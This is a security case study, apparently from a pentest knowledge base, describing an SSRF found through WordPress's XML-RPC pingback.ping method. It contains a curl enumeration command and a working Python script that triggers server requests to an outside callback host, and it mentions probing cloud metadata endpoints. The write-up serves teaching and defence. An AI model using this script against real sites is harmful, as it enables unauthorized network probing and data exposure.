# Case Study: WordPress SSRF via XML-RPC Pingback

## Overview
This case study documents the discovery and exploitation of a Server-Side Request Forgery (SSRF) vulnerability through WordPress's XML-RPC interface. The `pingback.ping` method was abused to make the server issue arbitrary HTTP requests to attacker-controlled endpoints.

## Target Context (anonymized)

- **Platform**: WordPress 6.x with default XML-RPC enabled.
- **CMS**: Standard WordPress installation with WooCommerce and multiple plugins.
- **Initial access**: Unauthenticated — the XML-RPC endpoint was publicly accessible.

## Vulnerability

**Type**: Server-Side Request Forgery (SSRF) via XML-RPC `pingback.ping`

WordPress's XML-RPC interface (`/xmlrpc.php`) exposes a `pingback.ping` method that, by design, makes the server send an HTTP request to a URL provided in the method call. If the application does not restrict which URLs the server can contact, an attacker can use this to:

- Reach internal services and cloud metadata endpoints.
- Scan internal networks.
- Exfiltrate data via server-initiated requests.

## Recon and Discovery

### 1. Finding the endpoint
The `xmlrpc.php` endpoint was discovered through **Wayback Machine** historical URL data — it was indexed in archived versions of the site even though it was not linked from the visible frontend.

### 2. Enumerating available methods
Sent a `system.listMethods` request to see what operations were exposed:

```bash
curl -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

The response revealed a full list of available methods, including the critical:
- `pingback.ping`
- `pingback.extensions.getPingbacks`
- Various `wp.*`, `blogger.*`, and `metaWeblog.*` methods

### 3. Identifying the high-risk method
The `pingback.ping` method accepts two parameters:
1. **Source URL** — the URL the server will fetch (attacker-controlled).
2. **Target URL** — a valid URL on the WordPress site.

This means the server will make an HTTP request to any URL specified as the source.

## Exploitation

### Attack script

```python
import requests
import uuid

target = "https://target.com/xmlrpc.php"
callback_domain = "your-collaborator.com"
attempts = 10

for i in range(attempts):
    subdomain = str(uuid.uuid4()).replace("-", "")
    payload_url = f"http://{subdomain}.{callback_domain}"

    data = f"""
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>{payload_url}</string></value></param>
        <param><value><string>https://target.com/</string></value></param>
      </params>
    </methodCall>
    """

    print(f"[*] Sending payload with: {payload_url}")
    r = requests.post(target, data=data, headers={"Content-Type": "text/xml"}, verify=False)
    print(f"[+] Response: {r.status_code}\n{r.text[:200]}...\n")
```

### Confirmation
- Each request generated a unique subdomain on the collaborator/callback server.
- The collaborator logged incoming HTTP requests **from the target server's IP**, confirming the SSRF.
- The server was making outbound requests to arbitrary URLs on behalf of the attacker.

## Impact

| Impact area | Description |
|------------|-------------|
| **SSRF** | Server makes requests to attacker-controlled or internal URLs |
| **Internal scanning** | Could probe internal network ranges and cloud metadata (e.g., `169.254.169.254`) |
| **Known CVEs** | XML-RPC methods have a history of CVEs — brute force, DDoS amplification |
| **Data exfiltration** | Response content from internal resources may leak through error messages |

## Lessons Learned

1. **Wayback Machine is an underrated recon source** — endpoints that are hidden or delisted may still exist and be accessible.
2. **XML-RPC is often left enabled by default** in WordPress installations. It should be disabled or restricted unless actively needed.
3. **System method enumeration** (`system.listMethods`) is the first step when you find any XML-RPC endpoint — it maps the entire attack surface.
4. **`pingback.ping` is the classic WordPress SSRF vector** — if it's available, it's worth testing.
5. **Use unique subdomains per request** to distinguish which attempts trigger callbacks (essential for blind SSRF confirmation).

## References

- `techniques/xxe-injection.md` (related XML-based attack)
- `scenarios/ssrf-via-xmlrpc-pingback-workflow.md` (generic workflow)
- `methodology/web-recon-methodology.md`
